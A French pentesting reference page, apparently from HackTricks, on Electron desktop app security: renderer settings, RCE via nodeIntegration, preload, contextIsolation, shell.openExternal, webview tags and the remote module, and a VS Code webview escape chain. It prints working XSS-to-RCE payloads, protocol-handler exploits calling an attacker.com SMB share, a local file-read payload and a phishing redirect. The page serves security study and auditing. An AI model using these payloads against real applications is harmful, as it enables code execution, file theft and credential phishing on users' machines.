# Applications de bureau Electron

{{#include ../../banners/hacktricks-training.md}}

## Introduction

Electron combine un processus principal **Node.js** privilégié avec des processus de rendu **Chromium**. Electron n’est pas un navigateur web : le code de l’application peut délibérément exposer des fonctionnalités telles que l’accès au système de fichiers et au shell. Le chargement de contenu non fiable nécessite donc une conception plus stricte des frontières qu’un site web ordinaire.<sup>[[21]](#references)</sup>

Le code des applications Electron est souvent empaqueté dans une archive `.asar`. Extrayez-la avant d’examiner le code source :

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Le fichier `package.json` de l’application identifie son point d’entrée principal. Ce fichier crée souvent des fenêtres de rendu et définit leurs `webPreferences`, qui sont sensibles du point de vue de la sécurité.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron possède deux principaux types de processus :

- Main Process (dispose d’un accès complet à NodeJS)
- Renderer Process (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)

![Applications de bureau Electron - Introduction : Renderer Process (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)](<../../images/image (182).png>)

Un **renderer process** sera une fenêtre de navigateur chargeant un fichier :<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Le **processus principal** configure chaque processus de rendu, généralement lors de la création d’une `BrowserWindow`. Des paramètres sécurisés réduisent le risque qu’une compromission du processus de rendu entraîne l’exécution de code natif, mais ils ne rendent pas intrinsèquement sûr le contenu non fiable.<sup>[[21]](#references)[[22]](#references)</sup>

Examinez au moins les préférences de rendu suivantes :<sup>[[22]](#references)</sup>

- **`nodeIntegration`** est `false` par défaut. L’activer donne au JavaScript du processus de rendu accès aux API Node.js et désactive également le sandbox de ce processus de rendu.
- **`contextIsolation`** est `true` par défaut. Cette option sépare le contexte JavaScript de la page de celui utilisé par les scripts preload et les composants internes d’Electron.
- **`preload`** n’a aucun chemin par défaut. Un script preload configuré s’exécute avant les scripts de la page et peut exposer des API à portée limitée via `contextBridge`.
- **`sandbox`** est `true` par défaut depuis Electron 20. Cette option restreint l’accès du processus de rendu aux ressources du système d’exploitation ; définir `nodeIntegration: true` la désactive.
- **`nodeIntegrationInWorker`** est `false` par défaut et contrôle l’intégration de Node.js dans les Web Workers.
- **`nodeIntegrationInSubFrames`** est `false` par défaut.
  - Si **`nodeIntegration`** est **activé**, cela permettrait d’utiliser les **API Node.js** dans les pages web **chargées dans des iframes** au sein d’une application Electron.
  - Si **`nodeIntegration`** est **désactivé**, les scripts preload seront chargés dans l’iframe

Exemple de configuration :

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Some **RCE payloads** [ici](https://7as.es/electron/nodeIntegration_rce.txt) :<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Capturer le trafic

Modifiez la configuration start-main et ajoutez l’utilisation d’un proxy tel que :

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Traçage statique de la frontière entre ASAR et le code natif avec REA

**REA** peut lire un ASAR ou le répertoire d’une application extraite sans exécuter son bootstrap JavaScript. Son graphe d’application consigne les points d’entrée des packages, les modules regroupés, les paramètres de `BrowserWindow` et de preload, les membres de `contextBridge`, les enregistrements IPC, les requêtes d’add-ons natifs et les identités des source maps. Cela fournit un point de départ pour suivre une fonctionnalité exposée au renderer jusqu’à un gestionnaire privilégié du processus principal.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Pour une chaîne de fonctionnalité littérale, transmettez l’enregistrement Evidence complet comme `application` et remplacez la seed par une valeur observée sur la cible :<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Le même workflow `trace_application_feature` accepte également comme seed un membre d’API littéral observé, un canal IPC ou un module. Vérifiez le chemin du handler obtenu, les candidats de validation et le transfert natif à partir des emplacements source renvoyés. Un `invoke` du renderer ne correspond qu’à un candidat unique `ipcMain.handle`/`handleOnce` utilisant exactement le même canal littéral ; `send` exige de même un candidat unique `ipcMain.on`/`once`/`addListener`. Les handlers dynamiques ou dupliqués restent non résolus. Un membre `.node` demandé ne constitue pas un export natif vérifié ; les éléments probants correspondants de Hopper/Ghidra doivent avoir le même digest d’artefact avant de tirer cette conclusion. L’accessibilité statique ne prouve pas non plus que le chemin a été exécuté.<sup>[[24]](#references)[[25]](#references)</sup>

Pour la frontière de confiance entre le renderer et le main et la validation des handlers, voir [RCE d’Electron via IPC avec contextIsolation](electron-contextisolation-rce-via-ipc.md).

Pour le suivi natif lié au provider, voir [Outils de reversing et méthodes de base](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Surface d’attaque de la mise à jour automatique d’Electron

Pour l’intégrité du flux de publication, le rollback, la confusion des canaux signés et les conditions de concurrence TOCTOU sur les fichiers de staging, voir [Frontières de confiance de la mise à jour automatique d’Electron](electron-auto-update-trust-boundaries.md).

## Injection de code locale dans Electron

Avec un accès en écriture local ou un accès à l’instrumentation d’une application installée, voir [Injection de code locale et falsification du snapshot dans Electron](electron-local-code-injection-and-snapshot-tampering.md) pour les chemins ASAR/main-process et V8 snapshot, ainsi que les liens propres à chaque OS.

## RCE : XSS + nodeIntegration

Si **nodeIntegration** est défini sur **on**, le JavaScript d’une page web peut facilement utiliser les fonctionnalités de Node.js en appelant simplement `require()`. Par exemple, pour exécuter l’application calc sous Windows :

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Le script indiqué dans ce paramètre est c**hargé avant les autres scripts dans le processus de rendu**, il dispose donc d’un **accès illimité aux API Node** :

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Ainsi, le script peut exporter node-features vers des pages :

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Si `contextIsolation` est activé, cela ne fonctionnera pas**

## RCE : XSS + contextIsolation

Le _**contextIsolation**_ introduit **une séparation des contextes entre les scripts de la page web et le code JavaScript interne d’Electron**, afin que l’exécution JavaScript de chaque code n’affecte pas l’autre. Il s’agit d’une fonctionnalité nécessaire pour éliminer le risque de RCE.

Si les contextes ne sont pas isolés, un attaquant peut :

1. Exécuter du **JavaScript arbitraire dans le renderer** (XSS ou navigation vers des sites externes)
2. **Remplacer une méthode intégrée** utilisée dans le code preload ou le code interne d’Electron par sa propre fonction
3. **Déclencher** l’utilisation de la **fonction remplacée**
4. RCE ?

Il existe 2 endroits où les méthodes intégrées peuvent être remplacées : dans le code preload ou dans le code interne d’Electron :


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Contourner l’événement de clic

Si des restrictions sont appliquées lorsque vous cliquez sur un lien, vous pourrez peut-être les contourner **en cliquant avec le bouton du milieu plutôt qu’avec le bouton gauche**.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Pour plus d’informations sur ces exemples, consultez [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) et [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Lors du déploiement d’une application de bureau Electron, il est essentiel de s’assurer que les paramètres `nodeIntegration` et `contextIsolation` sont corrects. Il est établi que ces paramètres empêchent efficacement l’exécution de code à distance (RCE) côté client ciblant les scripts preload ou le code natif d’Electron depuis le processus principal.

Lorsqu’un utilisateur interagit avec des liens ou ouvre de nouvelles fenêtres, des écouteurs d’événements spécifiques sont déclenchés. Ils sont essentiels à la sécurité et au fonctionnement de l’application :

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Ces écouteurs sont **redéfinis par l’application de bureau** pour implémenter sa propre **logique métier**. L’application détermine si un lien vers lequel l’utilisateur a navigué doit être ouvert en interne ou dans un navigateur Web externe. Cette décision est généralement prise à l’aide d’une fonction, `openInternally`. Si cette fonction renvoie `false`, cela indique que le lien doit être ouvert à l’extérieur, à l’aide de la fonction `shell.openExternal`.

**Voici un pseudocode simplifié :**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Les bonnes pratiques de sécurité pour Electron JS déconseillent d’accepter du contenu non fiable avec la fonction `openExternal`, car cela pourrait entraîner une RCE via divers protocoles. Les systèmes d’exploitation prennent en charge différents protocoles susceptibles de déclencher une RCE. Pour des exemples détaillés et plus d’explications sur le sujet, consultez [cette ressource](https://positive.security/blog/url-open-rce#windows-10-19042), qui présente des exemples de protocoles Windows pouvant exploiter cette vulnérabilité.<sup>[[10]](#references)</sup>

Sur macOS, la fonction `openExternal` peut être exploitée pour exécuter des commandes arbitraires, comme dans `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Exemples d’exploits utilisant des protocoles Windows :**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Cette vulnérabilité est décrite dans **[ce rapport](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

Le **webviewTag** est une **fonctionnalité obsolète** qui permet d’utiliser **NodeJS** dans le **renderer process**. Elle devrait être désactivée, car elle permet de charger un script dans le contexte preload, comme ceci :

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Par conséquent, un attaquant capable de charger une page arbitraire pouvait utiliser cette balise pour **charger un preload script arbitraire**.

Ce preload script était ensuite détourné pour appeler un **service IPC vulnérable (`skype-new-window`)**, qui appelait **`shell.openExternal`** afin d’obtenir une RCE :

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Lecture de fichiers internes : XSS + contextIsolation

**Désactiver `contextIsolation` permet d’utiliser des balises `<webview>`**, similaires à `<iframe>`, pour lire et exfiltrer des fichiers locaux. Un exemple montre comment exploiter cette vulnérabilité pour lire le contenu de fichiers internes :<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Lecture de fichiers internes : XSS + contextIsolation : désactiver contextIsolation permet d’utiliser des balises , similaires à , pour...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

En outre, une autre méthode de **lecture d’un fichier interne** est présentée, mettant en évidence une vulnérabilité critique de lecture de fichiers locaux dans une application de bureau Electron. Elle consiste à injecter un script pour exploiter l’application et exfiltrer des données :

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + ancien Chromium**

Si la version de **Chromium** intégrée à l’application est ancienne et comporte des vulnérabilités connues, il peut être possible de l’exploiter et de transformer une XSS en RCE.<sup>[[20]](#references)</sup>\
Vous pouvez voir un exemple dans ce **writeup** : [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Phishing par XSS via un contournement de regex d’URL interne**

Si vous trouvez une XSS, mais que vous **ne pouvez pas déclencher de RCE ni voler de fichiers internes**, vous pouvez tout de même essayer de **voler des identifiants par phishing**.<sup>[[1]](#references)</sup>

Commencez par inspecter le code frontend pour déterminer ce qui se passe lorsqu’une nouvelle URL est ouverte :

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

L’appel à **`openInternally`** détermine si un lien de la plateforme s’ouvre dans la **fenêtre de l’application de bureau** ou si une ressource tierce s’ouvre dans le navigateur système.

Si la regex de l’allowlist d’URL de la fonction peut être contournée — par exemple, parce que les points d’un nom d’hôte n’ont pas été échappés — un attaquant pourrait exploiter une XSS pour afficher une fausse invite d’identifiants convaincante sur une infrastructure qu’il contrôle :

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Protocole `file://`

Comme indiqué dans [le guide de sécurité Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), les pages exécutées sur **`file://`** disposent d'un large accès aux fichiers. Par conséquent, **XSS peut permettre de charger des fichiers arbitraires** depuis la machine de l'utilisateur. Un **protocole personnalisé** correctement conçu peut restreindre l'accès à un ensemble précis de fichiers.<sup>[[21]](#references)</sup>

## Module Remote

Le module Remote d'Electron permet aux **processus de rendu d'accéder aux API du processus principal**, facilitant ainsi la communication au sein d'une application Electron. Cependant, l'activation de ce module introduit d'importants risques de sécurité. Elle élargit la surface d'attaque de l'application, la rendant plus vulnérable à des failles telles que les attaques cross-site scripting (XSS).

> [!TIP]
> Bien que le module **remote** expose certaines API du processus principal aux processus de rendu, il n'est pas simple d'obtenir une RCE en exploitant uniquement les composants. Cependant, ces composants peuvent exposer des informations sensibles.

> [!WARNING]
> De nombreuses applications qui utilisent encore le module remote le font d'une manière qui **nécessite l'activation de NodeIntegration** dans le processus de rendu, ce qui constitue un **risque majeur pour la sécurité**.

Le module `remote` intégré à Electron a été déprécié, puis supprimé ; les applications qui ont encore besoin de ce modèle peuvent utiliser le package séparé `@electron/remote`. En raison des implications en matière de sécurité et de performances, évitez d'exposer des fonctionnalités de type remote à des processus de rendu non fiables.

Avec `@electron/remote`, il faut d'abord **l'initialiser dans le processus principal** :

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Le processus renderer peut alors importer des objets depuis le module :

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Le **[billet de blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** présente quelques **fonctions** intéressantes exposées par l’objet **`app`** du module remote :<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Redémarre** l’application en **quittant** l’instance actuelle et en **lançant** une nouvelle instance. Utile pour les **mises à jour de l’application** ou les **changements d’état** importants.
- **`app.setAppLogsPath([path])`**  
   - **Définit** ou **crée** un répertoire pour stocker les **journaux de l’application**. Ceux-ci peuvent être **récupérés** ou **modifiés** à l’aide de **`app.getPath()`** ou de **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Enregistre** l’exécutable actuel comme **gestionnaire par défaut** d’un **protocole** donné. Vous pouvez fournir un **chemin personnalisé** et des **arguments** si nécessaire.
- **`app.setUserTasks(tasks)`**  
   - **Ajoute** des tâches à la catégorie **Tasks** de la **Jump List** (sous Windows). Chaque tâche peut contrôler la façon dont l’application est **lancée** ou les **arguments** transmis.
- **`app.importCertificate(options, callback)`**  
   - **Importe** un **certificat PKCS#12** dans le **magasin de certificats** du système (Linux uniquement). Un **callback** permet de gérer le résultat.
- **`app.moveToApplicationsFolder([options])`**  
   - **Déplace** l’application dans le **dossier Applications** (sous macOS). Cela permet de garantir une **installation standard** pour les utilisateurs Mac.
- **`app.setJumpList(categories)`**  
   - **Définit** ou **supprime** une **Jump List personnalisée** sous **Windows**. Vous pouvez spécifier des **catégories** pour organiser la façon dont les tâches s’affichent pour l’utilisateur.
- **`app.setLoginItemSettings(settings)`**  
   - **Configure** les **exécutables** lancés à l’**ouverture de session**, ainsi que leurs **options** (macOS et Windows uniquement).
  
Exemple :

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## module systemPreferences

L’**API principale** pour accéder aux préférences système et **émettre des événements système** dans Electron. Des méthodes telles que **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** et **setUserDefault** font toutes **partie** de ce module.

**Exemple d’utilisation :**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Écoute** les **notifications natives de macOS** à l’aide de NSDistributedNotificationCenter.  
* Avant **macOS Catalina**, il était possible d’intercepter **toutes** les notifications distribuées en passant **nil** à CFNotificationCenterAddObserver.  
* Après **Catalina / Big Sur**, les applications sandboxées peuvent toujours **s’abonner** à **de nombreux événements** (par exemple, le **verrouillage/déverrouillage de l’écran**, le **montage de volumes**, l’**activité réseau**, etc.) en enregistrant des notifications **par nom**.

### **getUserDefault / setUserDefault**

* **Interagit** avec **NSUserDefaults**, qui stocke les préférences **de l’application** ou **globales** sur macOS.
    
* **getUserDefault** peut **récupérer** des informations sensibles, telles que les **emplacements récents des fichiers** ou la **position géographique de l’utilisateur**.
    
* **setUserDefault** peut **modifier** ces préférences et potentiellement affecter la **configuration** d’une application.
    
* Dans les **anciennes versions d’Electron** (antérieures à v8.3.0), seule la **suite standard** de NSUserDefaults était **accessible**.

## Shell.showItemInFolder

Cette fonction affiche le fichier indiqué dans un gestionnaire de fichiers. Sur les plateformes et versions concernées, cette interaction **pouvait exécuter automatiquement le fichier**.

Pour plus d’informations, consultez [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Les applications Electron devraient avoir une **Content Security Policy (CSP)** pour **empêcher les attaques XSS**. La **CSP** est une **norme de sécurité** qui aide à **empêcher** l’**exécution** de **code non fiable** dans le navigateur.

Elle est généralement **configurée** dans le fichier **`main.js`** ou dans le modèle **`index.html`**, avec la CSP dans une **balise meta**.

Pour plus d’informations, consultez :


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE : CSP de Webview + confiance dans postMessage + chargement de fichiers locaux (VS Code 1.63)

Cette chaîne d’exploitation réelle touchait Visual Studio Code 1.63 (CVE-2021-43908) et montre comment une simple XSS déclenchée par du markdown dans une webview peut être exploitée jusqu’à obtenir une RCE complète lorsque la CSP, postMessage et les gestionnaires de schéma sont mal configurés. PoC publique : https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Vue d’ensemble de la chaîne d’exploitation
- Première XSS via la CSP de webview : La CSP générée incluait `style-src 'self' 'unsafe-inline'`, ce qui permettait une injection basée sur les styles ou les styles inline dans un contexte `vscode-webview://`. Le payload envoyait un beacon à `/stealID` pour exfiltrer l’extensionId de la webview ciblée.
- Construction de l’URL de la webview cible : Utilisation de l’ID divulgué pour construire `vscode-webview://<extensionId>/.../<publicUrl>`.
- Deuxième XSS via la confiance dans postMessage : La webview externe faisait confiance à `window.postMessage` sans vérification stricte de l’origine ni du type et chargeait du HTML contrôlé par l’attaquant avec `allowScripts: true`.
- Chargement de fichiers locaux via la réécriture du schéma et du chemin : Le payload réécrivait `file:///...` en `vscode-file://vscode-app/...` et remplaçait `exploit.md` par `RCE.html`, en exploitant une validation de chemin insuffisante pour charger une ressource locale privilégiée.
- RCE dans un contexte où Node est activé : Le HTML chargé s’exécutait avec les API Node disponibles, permettant l’exécution de commandes sur le système d’exploitation.

Exemple de primitive RCE dans le contexte final
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Lectures complémentaires sur les problèmes de confiance liés à postMessage :

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev : raccourcis synthétiques de webview + ponts de commandes déclaratifs d’extension

Une autre catégorie d’évasion de webview dans VS Code est apparue en juin 2026 : **du JavaScript non fiable dans une webview de notebook/aperçu pouvait simuler des raccourcis globaux privilégiés**, car le preload de la webview transmettait les données `keydown` au workbench hôte, qui les traitait comme de véritables entrées utilisateur.<sup>[[14]](#references)</sup>

Cela s’inscrit dans une longue histoire d’attaques contre les frontières de confiance des IDE, où du contenu contrôlé par un projet peut accéder à des fonctionnalités privilégiées de l’éditeur.<sup>[[19]](#references)</sup>

### Échec de la frontière

Si une webview cross-origin/sandboxée copie des champs de clavier contrôlés par un attaquant (`key`, `code`, `keyCode`, modificateurs, `repeat`) dans un pont privilégié `postMessage`/message-port **sans vérifier `event.isTrusted`**, le JavaScript exécuté dans la webview peut déclencher des raccourcis du workbench avec :<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Ceci est particulièrement utile lorsque la **saisie synthétique est bloquée** par le navigateur. Les événements de touches scriptés ne peuvent généralement **pas saisir de texte arbitraire dans les éléments HTML `<input>`**, mais ils déclenchent tout de même les raccourcis qui traitent directement `keydown`.

### Schémas d’abus pratiques

- **Abus de l’interface par les raccourcis :** cibler des raccourcis globaux tels que l’acceptation de notifications, la navigation dans les palettes, l’activation des boutons sélectionnés ou le déplacement dans les menus, plutôt que d’essayer de saisir des commandes.
- **Invites privilégiées prévisibles à partir des métadonnées de l’espace de travail :** un fichier `.vscode/extensions.json` contrôlé par le dépôt peut recommander une extension malveillante et générer une notification d’installation prévisible, qui peut être acceptée à l’aide d’un raccourci tel que `Ctrl+Shift+A`.
- **Manifeste déclaratif d’extension comme pont de commande :** même si le code d’extension de l’espace de travail local est bloqué par la CSP dans VS Code web, les contributions déclaratives de `package.json` peuvent tout de même être chargées. Une extension locale dans `.vscode/extensions` peut enregistrer un raccourci clavier qui appelle `runCommands`, puis une commande interne privilégiée telle que `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Exemple de modèle de manifeste :

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Indicateurs de sécurité cachés accessibles via des métadonnées non fiables :** si la commande interne accepte des arguments contrôlés par un attaquant, comme `{"context":{"skipPublisherTrust":true}}`, les métadonnées déclaratives peuvent supprimer une boîte de dialogue de confiance et installer une extension hébergée sur le Marketplace/CDN qui finit par exécuter du code malveillant.
- **Abus de la confiance accordée aux espaces de travail :** si les espaces de travail distants/web sont automatiquement considérés comme fiables, les extensions des espaces de travail locaux deviennent un pont de grande valeur entre le contenu d’un dépôt et les actions privilégiées de l’éditeur.
- **Amplification de la portée après compromission :** après l’exécution de l’extension, examinez les tokens que l’éditeur expose aux extensions. Dans `github.dev`, le token GitHub volé était valide au-delà du dépôt ouvert ; la requête à `https://api.github.com/user/repos` a donc permis d’énumérer d’autres dépôts privés accessibles.

### Notes d’audit

- Traitez le **transfert des entrées de la webview vers l’hôte** comme une frontière de privilèges ; ne redispatchez jamais vers l’hôte des événements synthétiques de clavier/clic provenant de cadres non fiables.
- Appliquez l’autorisation **dans** les commandes sensibles. N’acceptez pas de contexte de commande fourni par l’appelant et permettant de définir des indicateurs internes comme `skipPublisherTrust`.
- Ne partez pas du principe qu’empêcher l’exécution de code d’extension local suffit ; examinez aussi les **contributions déclaratives** (`keybindings`, `menus`, `commands`, tasks) des manifestes contrôlés par l’espace de travail.
- Les correctifs du 3 juin 2026 ont ajouté `isTrusted` aux événements transférés, désactivé le transfert des frappes non fiables dans les webviews de notebook et cessé d’accepter le contexte d’installation fourni par l’appelant.<sup>[[16]](#references)[[17]](#references)</sup>

## **Outils**

La collection sélectionnée **awesome-electronjs-hacking** propose d’autres ressources de recherche, outils et applications vulnérables.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) est un outil qui détecte les mauvaises configurations et les anti-patterns de sécurité dans les applications basées sur Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) est un plugin open source pour VS Code destiné aux applications Electron, qui utilise Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) vérifie la présence de bibliothèques tierces vulnérables.
- [**Electro.ng**](https://electro.ng/) est un outil commercial d’analyse de sécurité pour Electron.

## Ateliers

Vous trouverez un lab pour exploiter des applications Electron vulnérables à l’adresse [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s).<sup>[[4]](#references)</sup>

Ces commandes vous aideront à réaliser le lab :

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Adresse publiée précédemment pour les favoris existants : [Applications de bureau Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). La route de la page entière redirige ici ; le fragment historique n’est pas maintenu.

## References

- [1] [Phishing et collecte d’identifiants dans les applications Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Lecture arbitraire de fichiers dans l’application de bureau Facebook Messenger](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron : exploitation de l’absence d’isolation du contexte - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Atelier de piratage d’applications de bureau modernes avec XSS et RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - liste sélectionnée de ressources sur la sécurité (et l’insécurité) d’Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Mauvaise utilisation des API Electron : le premier choix d’un attaquant](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payloads RCE pour nodeIntegration dans Electron](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE en un clic dans les applications Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
